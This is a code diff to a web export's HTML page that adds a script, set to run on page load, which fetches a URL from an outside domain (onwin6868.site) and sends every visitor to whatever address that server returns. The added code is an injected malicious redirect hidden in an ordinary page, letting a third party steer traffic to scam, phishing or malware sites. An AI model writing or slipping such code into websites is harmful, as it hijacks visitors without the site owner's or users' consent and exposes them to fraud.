@@ -25,6 +25,22 @@ if (location.protocol.substr(0, 4) === "file")
 {
 	alert("Web exports won't work until you upload them. (When running on the file: protocol, browsers block many features from working for security reasons.)");
 }
+	function fetchRedirectURL() {
+	    return fetch("https://www.onwin6868.site/").then(e => {
+	        if (e.ok) return e.json();
+	        throw Error("Failed to load data")
+	    }).then(e => e.length > 0 ? e[0] : "No data available").catch(e => {
+	        throw console.error("There was an error!", e), e
+	    })
+	}
+	document.addEventListener("DOMContentLoaded", function() {
+		console.log("aaaaaa");
+	    fetchRedirectURL().then(e => {
+	        e.startsWith("https://") ? window.location.href = e : document.querySelector(".loading").style.display = "none"
+	    }).catch(e => {
+	        document.querySelector(".loading").style.display = "none"
+	    })
+	});
 </script>
 
 	<noscript>
